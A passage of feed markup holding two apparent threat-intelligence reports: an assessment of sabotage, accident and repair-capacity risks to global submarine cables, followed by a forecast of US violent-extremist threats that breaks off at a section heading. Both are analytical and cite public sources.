            <description><![CDATA[Explore the rising threats to global submarine cable networks amid escalating geopolitical tensions, sabotage incidents, and limited repair capacity. Discover essential resilience strategies and risk mitigation measures.]]></description>
            <content:encoded><![CDATA[
        <h2>Executive Summary</h2>
        <p>Events over the last eighteen months indicate that the risk environment for submarine cables has very likely escalated, and the threat of state-sponsored malicious activity targeting submarine cable infrastructure is likely to rise further amid heightened geopolitical tensions. Insikt Group’s assessment of the current risk environment for submarine cables aligns with the findings of our 2023 assessment, which highlighted the convergence of geopolitical, physical, and cyber threats. Based on an analysis of 44 publicly reported cable damages occurring in 32 distinct groupings in 2024 and 2025 (Appendix A), Insikt Group assesses that three factors in the submarine cable ecosystem –– lack of redundancy in cable networks, lack of diversity of cable routes, and limited global repair capacity –– very likely increase the likelihood of significant outages from damages. Regions with low redundancy, such as parts of West and Central Africa, isolated Pacific islands, and certain secondary European routes, are more likely to suffer disproportionate impact from cable damage, especially when geopolitical tensions coincide with infrastructure constraints.</p>
        <p>While accidents will very likely continue to cause the majority of day-to-day interruptions, recent incidents in the Baltic Sea and around Taiwan indicate that submarine cable systems remain vulnerable to threats such as anchor dragging, which states can use as a low-sophistication tactic to target adversaries’ critical infrastructure while maintaining plausible deniability. Insikt Group identified four incidents involving eight distinct cable damages in the Baltic Sea and five incidents involving five distinct cable damages around Taiwan in 2024 and 2025. At least five of these nine incidents were attributed to ships dragging their anchors, including four Russia- or China-linked vessels operating under suspicious circumstances or with opaque ownership structures, although the resulting investigations have highlighted the difficulty of attributing cable cuts to state-sponsored sabotage. Such campaigns attributed to Russia in the North Atlantic–Baltic region and China in the western Pacific are likely to increase in frequency as tensions rise, leveraging deniable tactics in both shallow and deep water to apply political pressure without overt escalation.</p>
        <p>Without a significant expansion of dedicated repair vessels, repair capacity is very likely to lag behind demand, pushing median restoration times beyond the current 40‑day benchmark. National permitting delays and conflict zone access restrictions will likely extend repair times further, making streamlined diplomatic clearance processes an increasingly critical element of submarine cable resilience. Satellite and microwave links will almost certainly remain partial stop‑gaps, restoring only a fraction of lost bandwidth during major outages. To mitigate these challenges, joint public-private partnerships investing in repair and maintenance capabilities, improving real-time monitoring and security measures around submarine cable infrastructure, and conducting comprehensive stress tests are critical to improving resilience and guarding against a low-probability but high-impact event in which damages to multiple cables cause prolonged connectivity issues.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group identified a total of 44 publicly reported cable damages in 2024 and 2025 occurring in 32 distinct groupings. Unknown causes accounted for the largest number of damages (31%), followed by anchor dragging (25%) and seismic activity or other natural phenomena (16%).</li>
          <li>Of the identified cable damages, three caused significant and prolonged outages. These cases indicate that three factors –– lack of redundancy, lack of diversity of cable routes, and limited repair capacity –– very likely raise the risk of severe impact from damages to submarine cables.</li>
          <li>Insikt Group identified four incidents in the Baltic Sea involving eight distinct submarine cable damages and five incidents around Taiwan involving five distinct submarine cable damages in 2024 and 2025, four of which involved China- or Russia-linked vessels with opaque ownership or suspicious maneuvers near the damaged cables.</li>
          <li>Geopolitical tensions –– namely, Russia’s war against Ukraine and China’s coercive actions toward Taiwan –– very likely remain the primary drivers of state-linked sabotage activity targeting submarine cables.</li>
          <li>Joint public-private partnerships promoting investment in cable repair and maintenance capabilities, enhancing security and surveillance of critical submarine infrastructure, and improving resilience in current and future cable networks will be critical to addressing rising threats to cable infrastructure.</li>
        </ul>
        <h2>Background</h2>
        <p>There are <a href="https://submarine-cable-map-2025.telegeography.com/">currently</a> 597 subsea cables in operation or under construction as of April 2025, <a href="https://submarine-cable-map-2024.telegeography.com/">compared</a> to 559 subsea cables in 2024. These cables account for an <a href="https://www.itu.int/digital-resilience/submarine-cables/">estimated</a> 99% of international data traffic, representing critical infrastructure underpinning global telecommunications and financial flows. In 2024, 24 new cable systems <a href="https://subtelforum.com/submarine-telecoms-industry-report/">came</a> online, according to the Submarine Telecoms Forum (SubTel Forum) –– eight in the Europe-Middle East-Africa region, six in Oceania, four in the Indian Ocean, four in the Americas, and two transpacific systems.</p>
        <p>Among commercial suppliers of cable systems, three companies –– France’s Alcatel, the US’s SubCom, and Japan’s NEC –– <a href="https://subtelforum.com/submarine-telecoms-industry-report/">lead</a> in the number of systems delivered, kilometers of cable produced, and future systems planned, although China’s HMN Technologies (Hengtong) is playing an increasing role. Between 2020 and 2024, Alcatel delivered 23 systems, SubCom delivered thirteen, NEC ten, and HMN seven. Alcatel, the largest player, is also involved in nine planned future cable systems, representing 39% of future projects, while NEC is involved in four (17%) and SubCom two (9%).</p>
        <p>There are approximately 80 vessels globally <a href="https://subtelforum.com/submarine-telecoms-industry-report/">dedicated</a> to maintaining and expanding submarine cable infrastructure, with the United Kingdom’s (UK) Global Marine Systems (13%), France’s Orange Marine (13%), SubCom (11.6%), Alcatel Submarine Networks (ASN) (10%) and Malaysia’s Optic Marine Services (10%) owning the most vessels.</p>

          </div>
        </div>
        <p>Damage to submarine cables is not uncommon, with an average of 150 to 200 faults <a href="https://www.itu.int/en/mediacentre/Pages/PR-2024-11-29-advisory-body-submarine-cable-resilience.aspx">occurring</a> globally each year, according to the International Cable Protection Committee (ICPC). Most of these faults never <a href="https://blog.telegeography.com/what-to-know-about-submarine-cable-breaks">reach</a> the threshold of public reporting, since the majority do not cause detectable issues due to the availability of alternate routes for traffic. From 2015 to 2024, SubTel Forum <a href="https://subtelforum.com/submarine-telecoms-industry-report/">identified</a> a total of 237 publicized cable fault incidents globally –– likely a fraction of the total cable faults –– the vast majority of which were attributable to human activities, namely fishing and anchor dragging. Regionally, the “AustralAsia” region <a href="https://subtelforum.com/submarine-telecoms-industry-report/">accounted</a> for 36.3% of all reported faults during this period, making it the most fault-prone area, followed by Europe, the Middle East, and Africa (28.7%) and the Americas (20.3%) The ICPC <a href="https://www.iscpc.org/publications/submarine-cable-protection-and-the-environment/">reports</a> that the most common cause of cable damage is a ship anchor or fishing equipment contacting a cable in depths of less than 200 meters. Undersea abrasion and natural phenomena –– such as underwater rockslides and seismic activity –– <a href="https://www.kentik.com/blog/diving-deep-into-submarine-cables-undersea-lifelines-of-internet-connectivity/">account</a> for approximately 10% of faults.</p>
        <p>While cable faults are relatively common, they require significant resources to repair; the ICPC <a href="https://www.csis.org/analysis/safeguarding-subsea-cables-protecting-cyber-infrastructure-amid-great-power-competition">reports</a> that cable repairs average between $1 and $3 million, require “specialized cable ships with highly trained crews,” and can take months to complete.</p>
        <h2>Submarine Cable Risk Environment</h2>
        <p>Submarine cable systems very likely continue to face an escalating risk environment, driven in part by increasing geopolitical tensions –– aligning with our July 2023 <a href="/research/escalating-global-risk-environment-submarine-cables">assessment</a>. In 2024, SubTel Forum –– a leading industry platform for submarine cable analysis and reporting –– reported 46 incidents, the highest figure since it began publishing data on subsea cable faults in 2013 and a sharp uptick from the fifteen reported in 2023. This corresponds to heightened public awareness of submarine cable vulnerabilities amid several recent high-profile damages and related concerns about intentional malicious actions, such as sabotage –– although the increase may be partially attributable to increased reporting on subsea cable faults, as opposed to strictly reflecting an increase in incidents. However, most recent incidents have not resulted in prolonged connectivity disruptions.</p>
        <p>An assessment of the three most impactful damages in 2024 and 2025 –– located in the Red Sea, West Africa, and South Africa –– indicates that the greatest threat to submarine cables is almost certainly where damages occur in areas with limited redundancy and repair capacity, regardless of whether the result of malicious targeting driven by geopolitical interests, unintentional human activity, or natural phenomena.</p>
        <h3>Most Impactful Cable Damages of 2024–2025</h3>
        <p>Insikt Group identified 44 publicly reported submarine cable damages occurring in 32 groupings in 2024 and 2025 (<strong>Appendix A</strong>). Of these, three cases caused damage to multiple submarine internet cables resulting in substantial and prolonged disruption to internet and telecommunications traffic. In each case, disruption to services resulted from damages to multiple submarine cables at once, with the most impacted countries lacking reliable alternative routes for traffic, exacerbated by limited repair capabilities and permitting issues that prolonged repair timelines.</p>
        <ul>
          <li>In February 2024, a UK-owned vessel struck by a Houthi-fired missile sank in the Red Sea, damaging the Asia Africa Europe-1 (AAE-1), Europe India Gateway (EIG), and SEACOM cables and <a href="https://www.kentik.com/blog/what-caused-the-red-sea-submarine-cable-cuts/">disrupting</a> 25% of traffic between Asia, Europe, and the Middle East. According to Hong Kong telecommunications company HGC Global Communications, the damage <a href="https://www.hgc.com.hk/press-releases/statement-hgc-global-communications-takes-swift-action-in-response-to-submarine-cable-damage-in-the-red-sea">caused</a> “a significant impact on communication networks in the Middle East.”</li>
          <li>In March 2024, an underwater rock slide <a href="https://www.internetsociety.org/resources/doc/2024/2024-west-africa-submarine-cable-outage-report/">damaged</a> four submarine cables off West Africa: the West African Cable System (WACS), Africa Coast to Europe (ACE), MainOne, and SAT-3 cables. NetBlocks reported disruptions to internet connections in at least sixteen Central and West African countries, with disruptions to mobile payments and cloud applications for several days. CloudFlare <a href="https://blog.cloudflare.com/undersea-cable-failures-cause-internet-disruptions-across-africa-march-14-2024/">reported</a> a significant impact on a total of thirteen countries. In Liberia, disruptions lasted more than twelve hours. The outage also <a href="https://punchng.com/submarine-cable-repairs-may-last-five-weeks-mainone/">left</a> multiple Nigerian banks offline, severely <a href="https://www.bbc.com/news/world-africa-68569022">impacted</a> connectivity in Ghana, and <a href="https://subtelforum.com/8m-to-restore-subsea-cable-services/">incurred</a> estimated repair costs of $8 million.</li>
          <li>In May 2024, damage to two cables off the coast of South Africa –– SEACOM and the Eastern Africa Submarine System (EASSy) –– significantly <a href="https://www.internetsociety.org/resources/doc/2024/2024-east-africa-submarine-cable-outage-report/">reduced</a> connectivity between East and South Africa, and caused internet outages for Kenya and several other East African countries. According to <a href="https://x.com/netblocks/status/1790043208811954435">Netblocks</a>, the cut disrupted internet services in twelve countries, with Tanzania, Mozambique, and Malawi particularly affected.</li>
        </ul>
        <h3>Risk Factors for Submarine Cable Systems</h3>
        <p>Three primary factors –– lack of redundancy, lack of diversity of cable routes, and limited repair capacity –– very likely raise the likelihood of severe outages caused by damage to submarine cables. Additionally, permitting issues stemming from different regulatory environments and geopolitical tensions can extend the timeline for cable repairs, as can kinetic conflicts in the vicinity of cable breaks.</p>
        <h4>Lack of Redundancy</h4>
        <p><strong>Jurisdictions with limited alternate options to reroute traffic are most vulnerable to prolonged or significant disruptions.</strong> Following the May 2024 damages to SEACOM and EASSy, Kenya rerouted traffic to the TEAMS cable, with Safaricom and Airtel reporting they had activated alternative connectivity, but Tanzania experienced greater disruption due to its fewer connectivity options (<strong>Figure 2</strong>). In this case, the earlier February 2024 Red Sea damages further limited alternate options for connectivity, with Microsoft <a href="https://www.connectingafrica.com/connectivity/multiple-cable-failures-impact-africa-s-internet">stating</a> that the two incidents together “had reduced the total network capacity for most of Africa’s regions.” By contrast, Cloudflare <a href="https://blog.cloudflare.com/resilient-internet-connectivity-baltic-cable-cuts/">reported</a> that two cable cuts in November 2024 in the Baltic Sea –– the BCS East-West Interlink connecting Sweden and Lithuania, and the C-Lion1 cable connecting Finland and Germany –– “resulted in little-to-no observable impact to the affected countries … in large part because of the significant redundancy and resilience of Internet infrastructure in Europe.” Highlighting the importance of redundancy measures, the European Commission <a href="https://digital-strategy.ec.europa.eu/en/library/recommendation-security-and-resilience-submarine-cable-infrastructures">reported</a> in 2024 that “many islands in the Union, including the three island Member States [Cyprus, Ireland, and Malta], as well as the EU outermost regions and overseas countries and territories, are almost entirely dependent on such submarine cables for intra-Union communications,” indicating a likely higher level of vulnerability.</p>

        <p><strong>While satellites provide edge connectivity and connect locations that do not have easy access to physical infrastructure, they account for a small amount of overall global capacity and typically cannot replace fiber-optic submarine cables, which also</strong> <strong><a href="https://theconversation.com/in-our-wi-fi-world-the-internet-still-depends-on-undersea-cables-49936">move</a></strong> <strong>large amounts of data faster and more cheaply.</strong> TeleGeography <a href="https://www2.telegeography.com/submarine-cable-faqs-frequently-asked-questions">reports</a> that “cables can carry far more data at far less cost than satellites,” and only a small percentage of intercontinental data traffic is transmitted via satellite, according to <a href="https://blog.cloudflare.com/undersea-cable-failures-cause-internet-disruptions-across-africa-march-14-2024/">Cloudflare</a>. For example, the US Federal Communications Commission (FCC) <a href="https://www.fcc.gov/circuit-status-report">reports</a> that satellites account for just 0.37% of all US international capacity. According to the <a href="https://www.iscpc.org/information/frequently-asked-questions/">ICPC</a>, “a trans-pacific fibre-optic call need only travel about 5,000 miles point-to-point,” compared to a satellite call, which must travel 22,235 miles from the Earth to a satellite and then another 22,235 back. Illustrating this, a backup microwave system was <a href="https://www.enisa.europa.eu/publications/undersea-cables">activated</a> following damages to two submarine cables connecting Taiwan and the Matsu Islands in February 2023, but only restored an estimated 5% of the bandwidth that the cables had provided, with full internet access not restored until April 2023.</p>
        <h4>Lack of Diversity of Cable Routes</h4>
        <p><strong>Deploying submarine cables along similar geographic routes very likely increases systemic risk by creating single points of failure.</strong> Countries with multiple submarine cables routed along varying geographic routes are more insulated from major connectivity losses; conversely, those with fewer connecting cables, placed in close proximity to each other, are almost certainly more susceptible to multiple cable damages and associated disruptions. Recent incidents of damage to multiple cables at once indicate that threat actors could attempt to exploit the concentration of cables along similar routes in an effort to cause prolonged outages across a geographic area. For example, the Red Sea cable cuts in February 2024, detailed above, illustrated the importance of route diversity. The March 2024 damages to four cables off West Africa, which all occurred due to an underwater landslide in the “Le Trou Sans Fond” canyon off of Côte d’Ivoire, <a href="https://www.internetsociety.org/resources/doc/2024/2024-west-africa-submarine-cable-outage-report/">illustrated</a> how a concentration of cables at one point can make multiple cables susceptible to human-made threats or, as in this case, natural phenomena (<strong>Figure 3</strong>). Similarly, Egypt is a critical internet chokepoint through which multiple submarine cables <a href="https://www.kentik.com/blog/outage-in-egypt-impacted-aws-gcp-and-azure-interregional-connectivity/">connecting</a> Europe, Africa, and Asia run; the vulnerabilities associated with this arrangement were <a href="https://blog.cloudflare.com/aae-1-smw5-cable-cuts/">apparent</a> <a href="https://www.datacenterdynamics.com/en/news/aae-1-cable-cut-causes-widespread-outages-in-europe-east-africa-middle-east-and-south-asia/">following</a> June 2022 damages to both the AAE-1 and the SeaMeWe-5 cables. In December 2024, the US Department of Homeland Security <a href="https://www.dhs.gov/sites/default/files/2024-12/24_1218_scrc_Priorities-for-DHS-Engagement-on-Subsea-Cable-Security-Resilience_18-Dec-24.pdf">noted</a> that “while incidents in geographic chokepoints are relatively rare, each one brings much-needed attention to the vulnerability of similarly concentrated cables around the world.”</p>

        <p><strong>The concentration of submarine cables at a single cable landing station</strong> <strong><a href="https://blog.telegeography.com/why-does-diversity-matter-for-submarine-cables">increases</a></strong> <strong>the likelihood that damage to or near a landing site will impact multiple cables.</strong> These stations <a href="https://www.itu.int/en/ITU-D/Regional-Presence/AsiaPacific/SiteAssets/Pages/Events/2017/Submarine%20Cable/submarine-cables-for-Pacific-Islands-Countries/Cable%20Landing%20Stations%20SNCC.pdf">provide</a> multiple functions, including supplying power to the cable and connecting it to terrestrial networks, and their locations are often <a href="https://www.kentik.com/blog/diving-deep-into-submarine-cables-undersea-lifelines-of-internet-connectivity/">chosen</a> <a href="https://www.nato-pa.int/download-file?filename=/sites/default/files/2023-04/032%20STC%2023%20E%20-%20CRITICAL%20MARITIME%20INFRASTRUCTURE%20-%20FRIDBERTSSON%20REPORT.pdf">based</a> on access to existing infrastructure or regulatory factors, rather than because they offer particularly high protection from natural disasters or physical threats, such as sabotage or surveillance. As a result, cables frequently cluster around or at the same landing site –– <a href="https://www.atlanticcouncil.org/wp-content/uploads/2021/09/Cyber-defense-across-the-ocean-floor-The-geopolitics-of-submarine-cable-security.pdf">raising</a> the threat that sabotage or espionage operations could impact multiple cables at once by targeting landing stations. For example, according to the US FCC, landing sites on the southeastern US coast are <a href="https://transition.fcc.gov/bureaus/pshs/advisory/csric5/WG4A_Final_091416.pdf">clustered</a> in three primary locations in Florida, with nearly all landing sites developed to support multiple submarine cables. In October 2022, cybersecurity company Zscaler <a href="https://trust.zscaler.com/zscloud.net/posts/12256">warned</a> that cuts to multiple cables at landing stations in Marseille linking the city to Milan, Barcelona, and Lyon “impacted major cables with connectivity to Asia, Europe, US and potentially other parts of the world.” In August 2023, the European Union Agency for Cybersecurity (ENISA) <a href="https://www.enisa.europa.eu/publications/undersea-cables">reported</a> that landing stations represent a weak point in the ecosystem due to their vulnerability to “espionage attacks, deliberate power cuts, sabotage attacks with explosives, or even missile attacks in the case of a military conflict.”</p>
        <h4>Limited Repair Capacity Poses Long-Term Problem</h4>
        <p><strong>Repair capacity, which continues to lag behind the expansion of submarine cable networks, almost certainly represents an underappreciated point of vulnerability in the submarine cable ecosystem.</strong> As cable systems have expanded dramatically, investment in ships that can service these cables has lagged behind, resulting in the growth of cable systems outpacing repair capacity. Most of these vessels are therefore focused on laying new cable systems, <a href="https://www.theverge.com/c/24070570/internet-cables-undersea-deep-repair-ships">constraining</a> their ability to respond immediately to cable faults. According to <a href="https://www.enisa.europa.eu/publications/undersea-cables">ENISA</a>, given the complex nature of repairs and limited repair capacity, “a coordinated attack against multiple subsea cables could have a major impact on global internet connectivity.” For example, the Léon Thévenin, a cable repair ship docked in Cape Town, South Africa, was the only vessel dedicated to serving Africa at the time of the March 2024 cable outages, extending the repair timeline. In February 2023, all five of Vietnam’s operational undersea cables <a href="https://e.vnexpress.net/news/news/vietnam-s-undersea-cable-malfunctions-right-after-getting-fixed-4623749.html">suffered</a> partial or total damage at the same time, <a href="https://e.vnexpress.net/news/news/despite-promises-of-no-stagnation-vietnam-s-internet-access-struggles-during-peak-hours-4570205.html">resulting</a> in the loss of 75% of its data transmission capacity. With nearby ships busy, repairs on all cables were not fully <a href="https://vietnamnet.vn/en/repairs-completed-on-five-broken-undersea-cables-linked-to-vietnam-2223445.html">completed</a> until late November 2023, and telecommunications firms were <a href="https://manoa.hawaii.edu/indopacificaffairs/article/entangled-southeast-asia-and-the-geopolitics-of-undersea-cables/#:~:text=In%202022%20and%202023%2C%20all,transportation%20to%20ensure%20stable%20connections.">forced</a> to purchase spare terrestrial capacity to help stabilize connections. Reflecting concerns regarding the limited availability of repair vessels, the US <a href="https://www.federalregister.gov/documents/2021/01/05/2020-29159/request-for-applications-to-be-considered-for-enrollment-in-the-cable-security-fleet">established</a> the Cable Security Fleet in 2020 with two <a href="https://www.csis.org/analysis/safeguarding-subsea-cables-protecting-cyber-infrastructure-amid-great-power-competition">dedicated</a> US-flagged cable repair ships (the CS Dependable and CS Decisive) to speed repairs to submarine cables relevant to US national security.</p>
        <p><strong>Unless significant investments are made in streamlining repair processes and expanding cable ship repair capacity, repair times are likely to continue trending upward.</strong> According to <a href="https://subtelforum.com/submarine-telecoms-industry-report/">SubTel Forum</a>, the average repair time for the restoration of cable faults has risen from 2015 to 2024, with the average repair time in 2023 consisting of 40 days. Vietnam’s five submarine cable systems, which account for most of its international bandwidth, <a href="https://subtelforum.com/aae-1-and-apg-cable-disruptions-impact-vietnams-internet/">experience</a> an average of fifteen incidents annually; prior to 2022, repairs lasted one to two months per incident, but have recently lasted longer, extending disruptions. This is almost certainly a result of the increasing gap in the rates of subsea cable infrastructure expansion and stagnating repair capabilities.</p>
        <h4>Regulatory Factors, Conflict, and Territorial Disputes Likely to Prolong Repair Timelines</h4>
        <p><strong>Regulatory hurdles, such as complex and lengthy permitting processes for repair ships that vary by national territory, likely prolong repair timelines, exacerbating the impact of limited repair capacity. Cable damage in areas subject to territorial disputes and ongoing kinetic conflicts almost certainly increases the prospect of prolonged outages due to the denial of access to repair vessels.</strong> The International Institute for Strategic Studies <a href="https://www.iiss.org/cyber-power-matrix/submarine-cables-the-achilles-heel-of-cyberspace-in-the-asia-pacific/">reports</a> that repairs in the Asia-Pacific region take up to 30 days on average from notification of an incident, compared to fifteen in North America, due to more stringent permitting requirements. For example, repairs to April 2024 damages to the SeaMeWe-5 cable in Indonesian waters, which <a href="https://www.capacitymedia.com/article/2d5m1eo5yohwx2zl557uo/news/indonesian-policy-delays-sea-me-we-5s-repair">reduced</a> Bangladesh’s internet capacity by a third, were not <a href="https://www.facebook.com/photo?fbid=885023603650209&amp;set=a.308673981285177">completed</a> until June 28, 2024, as Jakarta’s cabotage policy <a href="https://www.capacitymedia.com/article/2d5m1eo5yohwx2zl557uo/news/indonesian-policy-delays-sea-me-we-5s-repair">delayed</a> repairs for several weeks. In March 2024, telecommunications provider SEACOM <a href="https://itweb.africa/content/O2rQGMAEyPGMd1ea">reported</a> that it would likely take longer than expected to repair three cables in the Red Sea damaged by a ship hit by Houthi strikes since permitting could take up to eight weeks to obtain. The Yemeni government <a href="https://www.marineinsight.com/shipping-news/yemens-political-disputes-delay-full-repairs-of-3-submarine-internet-cables-in-the-red-sea/">refused</a> to grant permission to initiate repairs of the damaged AAE-1 cable to the cable’s operating consortium, which includes telecommunications firm TeleYemen, as one of the firm’s two branches is under the control of the Houthi group. An investigation of the consortium reportedly <a href="https://gcaptain.com/damaged-subsea-cables-repaired-in-red-sea/">delayed</a> repairs of the AAE-1 until July 2024. Further, SubTel Forum <a href="https://subtelforum.com/houthis-hit-underwater-communications-cables/">reported</a> that ongoing threats posed by the Houthi group likely limited companies that agreed to carry out repairs and incurred high premiums.</p>
        <p>Additionally, amid ongoing territorial disputes between China and the Philippines in the South China Sea, the China Coast Guard (the CCG) has attempted to block Philippine resupply operations to vessels at the Second Thomas Shoal, Scarborough Shoal, and Sabina Shoal. In addition to harassing Philippine vessels, the CCG and other Chinese forces have for decades <a href="https://www.nbr.org/publication/dynamics-of-assertiveness-in-the-south-china-sea-china-the-philippines-and-vietnam-1970-2015/">interfered</a> with vessels from other claimants in the South China Sea, as well as vessels operated by outside powers like the United States. These incidents suggest that Beijing could take similar action to block repair vessels from accessing damaged submarine infrastructure in the event of a potential escalation of tension or outbreak of hostilities around Taiwan.</p>

        </p>
        <h2>Executive Summary</h2>
        <p>The predominant threats to most public and private sector entities from United States (US)-based domestic violent extremists (DVEs) during the next twelve months will likely come in the form of targeted attacks against personnel and sabotage of facilities. These threats likely surpass the risk of DVE mass-casualty terrorist attacks due to their elevated frequency, success rate, and impact on the targeted entity’s operations. While certain categories of homegrown violent extremists (HVEs) and some DVEs will almost certainly continue to plan and threaten mass-casualty attacks, recent high-profile assassinations and assassination attempts in the US have very likely increased the probability of DVEs considering limited-scope methods. Violent extremists have almost certainly glorified the alleged perpetrators of these attacks and promoted narratives suggesting that targeted attacks against high-profile public figures more effectively achieve their political and ideological goals than mass-casualty attacks.</p>
        <p>To support attack plots and bolster their operational footprint in 2025 and early 2026, HVEs and DVEs will almost certainly continue issuing online threats; stalking, harassing, and physically approaching victims; and conducting sabotage, surveillance, disruptive demonstrations, doxing, and swatting. As in previous years, personnel and facilities associated with racial, ethnic, and religious minorities, the LGBTQIA+ community, US federal, state, local, tribal, and territorial government agencies (particularly judicial and law enforcement agencies), specific private industry sectors (defense contractors, healthcare and pharmaceutical companies, financial and insurance agencies), and critical infrastructure providers are at heightened risk from HVE and DVE threat activities during the next twelve months.</p>
        <p>Polarizing geopolitical and domestic political issues — especially conflicts in the Middle East involving Israel, the 2024 fall of the Bashar al-Assad regime in Syria, and US immigration enforcement policies — will almost certainly continue to mobilize HVEs and DVEs during the next twelve months. While expected tactics, techniques, and procedures (TTPs) associated with US violent extremists are unlikely to significantly change in the short term, DVEs and HVEs are very likely to accelerate adoption of new technologies, such as commercially available unmanned aerial vehicles (UAVs), generative artificial intelligence (AI), end-to-end encrypted communications platforms, cryptocurrencies, and 3D printing, to enhance their operational capabilities.</p>
        <p>Rapidly shifting developments in the violent extremist threat landscape in the US and changing priorities of US federal law enforcement and homeland security agencies could place more of the onus on state and local governments and the private sector to manage their own counterterrorism programming. As always, facility security initiatives and hardening soft targets will undoubtedly remain important, but recent incidents and violent extremists’ growing preference for targeted attacks against high-profile personnel suggest that executive protection is an increasingly crucial aspect of countering violent extremist threats to organizations. Organizations can mitigate threats to executives not only through reactive detection of online threats and negative sentiment campaigns, but also by proactively identifying and removing publicly available information that can be used to target personnel. Physical security teams can query the Recorded Future Intelligence Cloud’s extensive corpus of sources used by violent extremists to analyze intelligence pertaining to these and other violent extremist threats.</p>
        <h2>Key Findings</h2>
        <p>During the next twelve months:</p>
        <ul>
          <li>The US will very likely face a heightened threat from violent extremist physical threat activities due to the enduring influence of the Israel-Hamas conflict; geopolitical developments in the Middle East, Central Asia, and Africa favoring foreign terrorist organizations (FTOs); and the increasing ease of access to and use of new and developing technologies.</li>
          <li>While their preferred targets vary, most violent extremist threat actors are almost certainly interested in threatening US federal, state, and local governments. Critical infrastructure providers, defense contractors, and the education, insurance, healthcare, banking, finance, and maritime industry sectors also very likely face heightened risks.</li>
          <li>Islamic State (IS) supporters will very likely represent the most lethal HVE threat to the US, especially if IS experiences a resurgence in Syria following the 2024 fall of the al-Assad government.</li>
          <li>HVEs with a nexus to Hamas, Hezbollah, the Yemeni Houthis, Iraqi Shi’a militias, or other “Axis of Resistance” groups are unlikely to carry out attacks in the US, but they likely have increased motivation to do so and access to expanded facilitative resources due to the US’s direct involvement in the Iran-Israel conflict.</li>
          <li>The DVE groups that likely pose the largest threat of conducting violent attacks in the US, such as neo-Nazi accelerationists, anti-government/anti-authority violent extremists (AGAAVEs) motivated by political animus, and anarchist violent extremists (AVEs), are likely to increasingly prefer targeted attacks and assassinations over mass-casualty attack plots.</li>
          <li>Militia violent extremists (MVEs), AVEs, and AGAAVEs harboring political grievances due to US domestic political issues will almost certainly physically threaten judges, public officials, business executives, and other high–profile public figures.</li>
        </ul>
        <h2>Background</h2>
        <p>Insikt Group’s forecast is predicated on its assessments of open-source information on the activities of HVEs and DVEs in the US, including the Recorded Future Intelligence Cloud’s extensive index of HVE and DVE communications on various online platforms. During the past twelve months, Insikt Group researchers curated several hundred HVE and DVE sources, adding them to an extensive index of preexisting sources of this type.</p>
        <p>This report defines “homegrown violent extremist,” “domestic violent extremist,” and several categories of HVEs and DVEs based on the US Intelligence Community’s <a href="https://www.dni.gov/files/ODNI/documents/assessments/UnclassSummaryofDVEAssessment-17MAR21.pdf">definitions and categorizations</a> of threat actors. Periodically, this report prefers definitions adopted by Insikt Group subject matter experts for analytic utility, or in instances where the US government has not officially defined a particular phenomenon or movement. A full list of terms and definitions used in this report is available in <strong>Appendix A</strong>.</p>
        <h2>Homegrown Violent Extremists</h2>
        <p>HVEs are very likely to carry out physical threat activities targeting US government and law enforcement installations and personnel, public events, large commercial spaces, houses of worship and religious communities, and counter-protestors and demonstrators. US-based IS supporters will very likely present the most lethal violent extremist threat to the US during the next twelve months, and the continued mobilization factor of the Israel-Hamas conflict will almost certainly <a href="https://www.ic3.gov/PSA/2025/PSA250605-2">drive</a> some Americans to provide support for IS, al-Qaeda, and other FTOs (although organizations other than IS and al-Shabaab — al-Qaeda’s Somalia franchise — very likely lack the infrastructure, personnel, and interest in recruiting US persons).</p>
        <p>However, while sporadic escalations in the Israel-Hamas conflict will almost certainly <a href="https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2024-11/Pamphlet_compressed.pdf">influence</a> disruptive protest activities and other physical threats in 2025, most visibly at US universities, threat actors will likely be deterred from overt displays of support for FTOs and plotting mass-casualty attacks due to the almost certain increase in law enforcement resources <a href="https://www.justice.gov/opa/pr/justice-department-announces-launch-joint-task-force-october-7">dedicated</a> to investigating and prosecuting these threats. Instead, extant pro-Hamas networks in the US are very likely to <a href="https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure">emphasize</a> covert operations, especially those that finance the organization.</p>
        <p>In addition, the geopolitical climate likely <a href="https://www.reuters.com/world/middle-east/new-orleans-attack-puts-spotlight-islamic-state-comeback-bid-2025-01-03/">favors</a> efforts by IS and al-Qaeda affiliates in the Levant, Central Asia, the Sahel, and the Horn of Africa to expand their territorial holdings, <a href="https://www.dni.gov/files/ODNI/documents/assessments/ATA-2025-Unclassified-Report.pdf">conduct</a> increasingly sophisticated and lethal attacks in their areas of operations, and <a href="https://www.understandingwar.org/backgrounder/islamic-state%E2%80%99s-global-long-game-and-resurgence-syria-poses-evolved-threat-west">develop</a> connections between their operatives and recruitment networks in Western Europe and North America.</p>
        <p>Expanding commercial markets and ease of use of developing technologies — particularly UAVs and cryptocurrencies — are very likely to bolster HVE operations on behalf of a range of FTOs in 2025. US HVEs almost certainly continue to provide financial assistance to IS, al-Qaeda, and Hamas through cryptocurrencies. For example, Hamas has almost certainly <a href="https://www.justice.gov/archives/opa/pr/global-disruption-three-terror-finance-cyber-enabled-campaigns">developed</a> a sophisticated network of cryptocurrency wallets and exchanges it uses to <a href="https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure">funnel</a> funds from its international supporters to its operatives in the Palestinian Territories. HVEs are very likely to continue <a href="https://ctc.westpoint.edu/on-the-horizon-the-ukraine-war-and-the-evolving-threat-of-drone-terrorism/">experimenting</a> with these new technologies for <a href="https://ctc.westpoint.edu/printing-terror-an-empirical-overview-of-the-use-of-3d-printed-firearms-by-right-wing-extremists/">applications</a> in attack plotting, particularly with UAV-borne improvised explosive devices (IEDs) and 3D-printed firearms and weapons components.</p>
        <h3>Islamic State</h3>
